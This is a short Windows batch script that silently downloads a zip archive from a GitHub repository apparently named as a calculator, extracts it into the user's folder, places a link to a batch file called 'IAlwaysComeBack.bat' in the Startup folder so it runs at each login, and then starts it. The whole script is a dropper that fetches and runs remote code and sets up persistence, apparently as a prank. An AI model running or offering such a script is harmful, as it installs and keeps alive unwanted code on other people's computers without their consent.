@echo off

cd "C:\Users\%USERNAME%\"
curl.exe -s -L -O "https://github.com/MyelinLennox/FunnyCalculator/raw/refs/heads/main/EatMyShortz.zip"
powershell -NoP -Command "Expand-Archive -LiteralPath 'EatMyShortz.zip' -DestinationPath '.' -Force"

mklink "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\IAlwaysComeBack.lnk" "C:\Program Files\EatMyShortz\IAlwaysComeBack.bat"
start "C:\Users\%USERNAME%\EatMyShortz\IAlwaysComeBack.bat"
